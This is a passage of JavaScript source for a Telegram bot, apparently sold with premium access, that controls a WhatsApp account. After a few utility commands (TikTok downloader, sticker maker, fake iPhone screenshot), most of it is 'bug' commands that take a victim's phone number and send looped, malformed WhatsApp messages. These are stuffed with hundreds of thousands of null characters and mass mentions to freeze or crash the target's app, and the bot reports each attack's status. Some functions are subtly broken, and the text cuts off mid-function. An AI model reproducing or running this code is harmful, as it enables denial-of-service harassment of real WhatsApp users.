  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Gxion Kece ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});
// ================= CONNECT ================= //
bot.command("connect", checkOwner, async (ctx) => {
  try {
    if (!sock) {
      return ctx.reply("❌ Socket belum siap. Restart bot dulu.");
    }

    if (isWhatsAppConnected && sock.user) {
      return ctx.reply("✅ WhatsApp sudah terhubung.");
    }

    if (global.pairingMessage) {
      return ctx.reply("⚠️ Pairing masih aktif, tunggu dulu.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("Example:\n/connect 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    
    if (phoneNumber.length < 8 || phoneNumber.length > 15) {
      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/connect 628xxxx");
    }

    await new Promise(r => setTimeout(r, 1000));

    const code = await sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.replyWithPhoto(
      "https://files.catbox.moe/wmqqm5.jpg",//ganti jadi url catbox gambar lu
      {
        caption:
`<pre>⬡═―⊱「 𝑮𝑿𝑰𝑶𝑵 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ  Nomor  : ${phoneNumber}
ϟ  Kode   : ${formattedCode}
ϟ  Note  : KALO GAGAL PAIR HAPUS SESSION

ϟ  🟡 Status : Waiting for connection...
</pre>`,
        parse_mode: "HTML"
      }
    );

    global.pairingMessage = {
      chatId: msg.chat.id,
      messageId: msg.message_id
    };

    setTimeout(() => {
      global.pairingMessage = null;
    }, 60000);

  } catch (err) {
    console.log("Pairing error FULL:", err);
    global.pairingMessage = null;
    ctx.reply("❌ Gagal pairing!");
  }
});


// ================= KILL SESSION ================= //
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session dihapus, silakan /connect ulang");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session");
  }
});
/// ============= CASE BUG 1 BEBAS SPAM=============\\\
bot.command("specterdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /specterdelay 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`✅ specterdelay (bug) selesai untuk ${q}`);

  (async () => {
    for (let r = 0; r < 30; r++) {
  await DelayHardNullVnX(sock, target);
  await sleep(100);
}
  })();

});
/// CASE BUG BEBAS SPAM 2/// 
bot.command("delayworek", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
 
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /delayworek 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`✅ delayworek (bug) selesai untuk ${q}`);

  (async () => {
    for (let r = 0; r < 1; r++) {
  await ArtRevenge(sock, target);
}
  })();

});
/// ============= CASE BUG 3 BEBAS SPAM=============\\\
bot.command("EquarTerdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /EquarTerdelay 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`✅ EquarTerdelay (bug) terkirim untuk ${q}`);

  (async () => {
    for (let z = 0; z < 700; z++) {
  await ArTDeadass(sock, target);
  await sleep(1000);
}
  })();

});
/// ============= CASE BUG 4 BEBAS SPAM=============\\\
bot.command("dangerdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /dangerdelay 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`✅ dangerdelay (bug) terkirim dan selesai untuk ${q}`);

  (async () => {
    for (let r = 0; r < 20; z++) {
  await ArtGold(sock, target, true);
  await sleep(1000);
  
  await VnXDelayAiInvis(sock, target)
  await sleep(1000);
  
  await PaysQl(sock, target)
  await sleep(5000);
}
  })();

});
/// CASE BUG BEBAS SPAM 5 \\\
bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Example: /qiSys 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/pm6sti.jpg", {
    caption: `
<pre>交 Gxion System Attacks ᝄ
─ 𝙱𝚞𝚐 𝚜𝚞𝚌𝚌𝚎𝚜 𝚍𝚒𝚔𝚒𝚛𝚒𝚖 𝚔𝚎 𝚝𝚊𝚛𝚐𝚎𝚝, 𝚜𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚜𝚙𝚊𝚖  𝚋𝚞𝚐𝚜 𝚔𝚎𝚙𝚊𝚍𝚊 𝚝𝚊𝚛𝚐𝚎𝚝 𝚜𝚊𝚖𝚙𝚎 𝚖𝚊𝚖𝚙𝚞𝚜. 𝙶𝚞𝚗𝚊𝚔𝚊𝚗𝚕𝚊𝚑 𝚜𝚎𝚌𝚊𝚛𝚊 𝚋𝚒𝚓𝚊𝚔 𝚍𝚊𝚗 𝚓𝚊𝚗𝚐𝚊𝚗 𝚍𝚒 𝚜𝚊𝚕𝚊𝚑𝚐𝚞𝚗𝚊𝚔𝚊𝚗 👾

"⬡═―━⊱[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 ]⊰━—═⬡
☇ Target: ${q}
☇ Status: Succes
☇ Type: DELAY HARD IMVISIBLE MAYBE
</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 40; i++) {
      console.log(chalk.red(`Send Bug Delay Hard Spam ${i + 1}/30 To ${q}`));
      await DelayedStatusHard(sock, target, true);
      await sleep(1000);
      
      await SuperDelay(sock, target);
      await sleep (1000);
      
      await delayHold(sock, target);
      await sleep(10000)
    }
  })();
});
/// CASE BUG BEBAS SPAM 5 \\\
bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Example: /lowsdelay 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/pm6sti.jpg", {
    caption: `
<pre>交 Gxion System Attacks ᝄ

"⬡═―━⊱[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 ]⊰━—═⬡
☇ Target: ${q}
☇ Status: Succes
☇ Type: MEDIUM DELAY CAN SPAM BUGS
</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
  await FrZinTrS(sock, target);
  await sleep(1500);
  
  await delayGabuts(sock,target);
  await sleep(3000);
    }
  })();
}); 
/// CASE BUG 6 \\\
bot.command("Xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Example : /Xange 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(

`
✅ SUCCES SEND BUGS TO : ${q}`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}`, style: "success" }],
      ],
    },
  });

  for (let i = 0; i < 10; i++) {
    await delayaw(sock, target);
    console.log(`Gxion Succes Sending Bugs To : ${target}`);
  }
})
/// --------- ( CASE BUG 7 ) ---------- \\\
bot.command("ultramencrash", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Example: /ultramencrash 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/pm6sti.jpg", {
    caption: `
<pre>交 Gxion System Attacks ᝄ
─ 𝙱𝚞𝚐 𝚜𝚞𝚌𝚌𝚎𝚜 𝚍𝚒𝚔𝚒𝚛𝚒𝚖 𝚔𝚎 𝚝𝚊𝚛𝚐𝚎𝚝,. 𝙶𝚞𝚗𝚊𝚔𝚊𝚗𝚕𝚊𝚑 𝚜𝚎𝚌𝚊𝚛𝚊 𝚋𝚒𝚓𝚊𝚔 𝚍𝚊𝚗 𝚓𝚊𝚗𝚐𝚊𝚗 𝚍𝚒 𝚜𝚊𝚕𝚊𝚑𝚐𝚞𝚗𝚊𝚔𝚊𝚗 ✅

"⬡═―━⊱[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 ]⊰━—═⬡
☇ Target: ${q}
☇ Status: Succes
☇ Type: BLANK NO SPAM BUGS
</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 70; i++) {
    await VnXBlankAiOneMsg
    await sleep(4000);
    }
  })();
});
// ------------ (  FUNCTION BUGS ) -------------- \\
async function DelayHardNullVnX(sock, target, ptcp = true) {
 
    let msg = await generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            body: {
                text: "VnX",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                version: 3
            }
        }
    }, { userJid: sock.user.id });

    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: msg.message
        }
    }, ptcp ? { 
        messageId: msg.key.id, 
        participant: { jid: target } 
    } : { 
        messageId: msg.key.id 
    });
}

async function ArtRevenge(sock, target) {
 while (true) {
  await sock.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "status@broadcast",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "ArT - Businnes",
              creator: "ArT - Revenge"
            },
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 209000 }, (_, z) => ({
              type: 1
            })),
            participant: sock.user.id
          },
          body: {
            text: "ArT - Revenge",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status:true } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
         }]
       }]
     }]
   })
 }
}

async function ArTDeadass(sock, target) {
  for (let z = 0; z < 700; z++) {
    const jut = {
      ephemeralMessage: {
        message: {
          groupStatusMessageV2: {
            message: {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: {
                      text: "ArT - Deadass"
                    },
                    nativeFlowMessage: {
                      buttons: [
                        { name: "\u0000\u0000\u0000", buttonParamsJson: "\u0000" },
                        { name: "single_select\u0000", buttonParamsJson: "{\u0000}" },
                        { name: "\x00\x00", buttonParamsJson: "\x00".repeat(198776) }
                      ]
                    },
                    nativeFlowResponseMessage: {
                      name: "address_message",
                      paramsJson: JSON.stringify({
                        flow_cta: "\u0000".repeat(2),
                        extra_data: {
                          address: {
                            in_pin_code: "999999",
                            building_name: "\u0000".repeat(198776),
                            landmark_area: "18+",
                            address: "london",
                            tower_number: "italia",
                            city: "florida",
                            name: "artillery".repeat(198776),
                            phone_number: "999999999999",
                            house_number: "13135550002",
                            floor_number: "@3135550202",
                            state: "X" + "\u0000".repeat(99987)
                          },
                          menu: {
                            display_text: "\u0000".repeat(198776),
                            description: "\u0000".repeat(198776),
                            id: "artillery"
                          },
                          payment: {
                            flow_cta: "{".repeat(99876)
                          }
                        }
                      }),
                      version: 3
                    },
                    contextInfo: {
                      businessMessageForwardInfo: {
                        businessOwnerJid: "0@s.whatsapp.net"
                      },
                      isForwarded: true,
                      forwardingScore: 999,
                      quotedMessage: {
                        conversation: "ArT - Deadass"
                      },
                      stanzaId: "BAE5" + Math.random().toString(16).slice(2),
                      participant: target,
                      remoteJid: target
                    },
                    header: {
                      hasMediaAttachment: true,
                      locationMessage: {
                        degreesLatitude: 21.1266,
                        degreesLongitude: -11.8199,
                        name: `#ArTDeadass¡` + "????".repeat(1),
                        jpegThumbnail: null,
                        contextInfo: {
                          externalAdReply: {
                            quotedAd: {
                              advertiserName: "????".repeat(198776),
                              mediaType: "IMAGE",
                              jpegThumbnail: null,
                              caption: "????".repeat(198776)
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, jut, {
      participant: { jid: target }
    });

    await new Promise(res => setTimeout(res, delay));
  }
}

async function ArtGold(sock, target) {
  while (Date.now() - Date.now() < 700000) {
    const ResponseList = {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "ArT - Gold",
            listType: 2,
            buttonText: null,
            singleSelectReply: { selectRowId: "🎄" },
            sections: Array.from({ length: 1999 }, (_, r) => ({
              title: "ꦽ".repeat(182622),
              rows: [`{ title: ${r + 1}, id: ${r + 1} }`],
            })),
            contextInfo: {
              participant: target,
              remoteJid: "status@broadcast",
              mentionedJid: [
                "1313224@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () => "2" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net")
              ],
              forwardingScore: 9172,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "9127162@newsletter",
                serverMessageId: 1,
                newsletterName: "ArT - Gold"
              }
            },
            description: "ArT - Gold"
          }
        }
      },
      contextInfo: {
        channelMessage: true,
        statusAttributionType: 2,
      }
    };

    await sock.relayMessage("status@broadcast", ResponseList, {
      statusJidList: [target],
      additional: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                }
              ]
            }
          ]
        }
      ]
    });
  }
}

async function DelayedStatusHard(sock, target) {
var mbg = generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "VnX"
},
nativeFlowResponseMessage: {
name: "call_permission_request",          
paramsJson: "\x10", 
version: 3,
}, 
entryPointConversionSource: "call_permission_request"    
}
}
}
},
{
participant: { jid: target },
},
);


  let mbg2 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: "#VnXNew  !",
              mentionedJid: ["13135559098@s.whatsapp.net"],
            },
            body: {
              text: "VnX",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"VnX","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );

  await sock.relayMessage('status@broadcast', mbg.message, {
    statusJidList: [target]
  });
  
  await sock.relayMessage('status@broadcast', mbg2.message, {
    statusJidList: [target]
  });
}

async function VnXDelayAiInvis(sock, target) {
    const VnXForwardAi = [
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot"
  ];

    while (true) {
        try {
            const msg = await generateWAMessageFromContent(
                target,
                {
                 groupStatusMessageV2: {
                    message: {
                      interactiveResponseMessage: {
                        contextInfo: {
                           mentionedJid: Array.from({ length: 200900 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
                         },
                          body: {
                             text: "VnXIsHere",
                                format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                   name: "galaxy_message",
                                   paramsJson: `{\"flow_cta\":\"${"\n".repeat(999999)}\"}}`,
                                   version: 3
                                 }
                           }
                      }
                 }
             },
          { userJid: sock.user.id } 
        );

            await sock.relayMessage(
                target,
                msg.message,
                {
                    messageId: msg.key.id,
                    participant: { jid: target }
                }
            );

            console.log(`👻 XdelayVnX ke ${target} (Looping Active)`);

            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (err) {
            console.error("❌ Error dalam Loop:", err);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

async function PaysQl(client, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " X ",
              mentionedJid: Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            },
            body: {
              text: " @vinzxiterr ",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "payment_info",
              paramsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"4UJPSC1FYKC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"¿!deadcode!¿","key":" ¿🎭? ${"\u0000".repeat(999999)}","key_type":"CPF"}}],"share_payment_status":false}`,
              version: 3
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  )

  for (let i = 0; i < 20; i++) {
    await client.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: target }
      }
    )

    await sleep(1500)
  }
}


async function SuperDelay(sock, target) {
  const msg = {
    message: {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "A - r - T",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
           contextInfo: {
            mentionedJid: Array.from({ length: 1990 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
            groupMentions: Array.from({ length: 2000 }, () => ({
            groupJid: `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
            groupSubject: "Artillery - Team"
            }))
            },
          }
        }
      }
    }
  };
 await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target } });
}

async function delayHold(sock, target) {
  const msg = {
    interactiveResponseMessage: {
      body: { 
        text: "ARTILLERY", 
        format: "DEFAULT" 
      },
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "\x10".repeat(700000),
        version: 3,
      },
      entryPointConversionSource: "{}",
      contextInfo: {
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: "FPM",
            expiryTimestamp: 1814400000
          }
        },
        mentionedJid: Array.from({ length: 100 }, () => "0@newsletter"),
        groupMentions: [
          {
            groupJid: "0@newsletter",
            groupSubject: "."
          }
        ],
        participant: target,
        remoteJid: target
      }
    }
  };
    
  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
}

async function fvckmklu(sock, target) {
  const tagMeta = Array.from(
    { length: 1900 },
    (_, v1nz) => `86705131476${v1nz}@s.whatsapp.net`
  );

  const msg = generateWAMessageFromContent(
    target,
    {
      interactiveResponseMessage: {
        body: {
          text: "\x10",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: "\x10".repeat(111111),
          version: 3
        },
        contextInfo: {
          mentionedJid: tagMeta
        }
      }
    },
    {}
  );

  for (let i = 0; i < 10; i++) {
    await client.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: target }
      }
    );

    await sleep(1500);
  }
}

async function delayGabuts(sock, target) {
  var jut = {
    interactiveResponseMessage: {
      name: "galaxy_message",
      paramsJson: "\u0000".repeat(145000),
      version: 3
    },
        nativeFlowResponseMessage: {
          text: "# ArT - Gabuts ¡",
          format: "DEFAULT"
        }
      };
    await sock.relayMessage(target, jut, {});
  } 
  
async function InvisibleStc(sock, target, cycleNum = 0) {
  try {
    let mentionCount;
    if (cycleNum <= 1) {
      mentionCount = 5000 + Math.floor(cycleNum * 1200);
    } else if (cycleNum <= 2) {
      mentionCount = 6200 + Math.floor((cycleNum - 1) * 1800);
    } else {
      mentionCount = 8000 + Math.floor((cycleNum - 2) * 2800);
    }
    mentionCount = Math.min(mentionCount, 28000);
    
    const massiveMentions = [];
    for (let i = 0; i < mentionCount; i++) {
      massiveMentions.push(`${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    }
    
    let padSize, currencyPadSize, amountPadSize, transactionPadSize, receiptPadSize, extraPadSize, mediaPadSize, linkPadSize, quotePadSize;
    
    if (cycleNum <= 1) {
      padSize = 25000 + (cycleNum * 10000);
      currencyPadSize = 15000 + (cycleNum * 6000);
      amountPadSize = 19000 + (cycleNum * 8000);
      transactionPadSize = 22000 + (cycleNum * 9000);
      receiptPadSize = 14000 + (cycleNum * 5500);
      extraPadSize = 11000 + (cycleNum * 4500);
      mediaPadSize = 18000 + (cycleNum * 7000);
      linkPadSize = 9000 + (cycleNum * 3500);
      quotePadSize = 13000 + (cycleNum * 5000);
    } else if (cycleNum <= 2) {
      padSize = 35000 + ((cycleNum - 1) * 16000);
      currencyPadSize = 21000 + ((cycleNum - 1) * 9500);
      amountPadSize = 27000 + ((cycleNum - 1) * 12500);
      transactionPadSize = 31000 + ((cycleNum - 1) * 14000);
      receiptPadSize = 19500 + ((cycleNum - 1) * 8500);
      extraPadSize = 15500 + ((cycleNum - 1) * 7000);
      mediaPadSize = 25000 + ((cycleNum - 1) * 10000);
      linkPadSize = 12500 + ((cycleNum - 1) * 5500);
      quotePadSize = 18000 + ((cycleNum - 1) * 7500);
    } else {
      padSize = 51000 + ((cycleNum - 2) * 22000);
      currencyPadSize = 30500 + ((cycleNum - 2) * 13500);
      amountPadSize = 39500 + ((cycleNum - 2) * 17500);
      transactionPadSize = 45000 + ((cycleNum - 2) * 19500);
      receiptPadSize = 28000 + ((cycleNum - 2) * 12000);
      extraPadSize = 22500 + ((cycleNum - 2) * 10000);
      mediaPadSize = 35000 + ((cycleNum - 2) * 14500);
      linkPadSize = 18000 + ((cycleNum - 2) * 8000);
      quotePadSize = 25500 + ((cycleNum - 2) * 11000);
    }
    
    padSize = Math.min(padSize, 128000);
    currencyPadSize = Math.min(currencyPadSize, 78000);
    amountPadSize = Math.min(amountPadSize, 95000);
    transactionPadSize = Math.min(transactionPadSize, 108000);
    receiptPadSize = Math.min(receiptPadSize, 72000);
    extraPadSize = Math.min(extraPadSize, 58000);
    mediaPadSize = Math.min(mediaPadSize, 88000);
    linkPadSize = Math.min(linkPadSize, 48000);
    quotePadSize = Math.min(quotePadSize, 68000);
    
    const garbageLen = Math.min(21 + Math.floor(cycleNum * 25), 1250);
    
    const baseTimestamp = Date.now();
    const fakeTimestamps = [
      baseTimestamp.toString() + "0".repeat(garbageLen),
      (baseTimestamp + 1000).toString() + "1".repeat(garbageLen),
